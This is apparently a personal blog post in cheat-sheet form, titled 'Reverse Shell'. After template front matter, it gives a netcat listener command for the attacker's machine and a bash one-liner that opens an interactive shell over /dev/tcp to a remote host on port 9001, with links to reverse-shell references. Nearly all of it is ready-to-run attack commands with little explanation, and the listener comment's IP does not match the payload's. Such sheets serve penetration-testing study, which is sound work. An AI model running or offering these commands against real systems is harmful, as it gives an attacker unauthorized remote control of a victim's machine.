---
title: Reverse Shell
date: 2022-10-18T01:30:03.000+00:00
tags:
- pentest
categories:
- cheatsheet
author: Me
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: Desc Text.
disableHLJS: false
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
  image: "<image path/url>"
  alt: "<alt text>"
  caption: "<text>"
  relative: false
  hidden: true

---
## Start a listener on attacker:
```
nc -lp 9001
# ip=10.10.10.10
# port=9001
```

## Run a shell on target:
* bash
```
bash -i >& /dev/tcp/192.168.1.10/9001 0>&1
```

## References
* https://www.revshells.com/
* https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
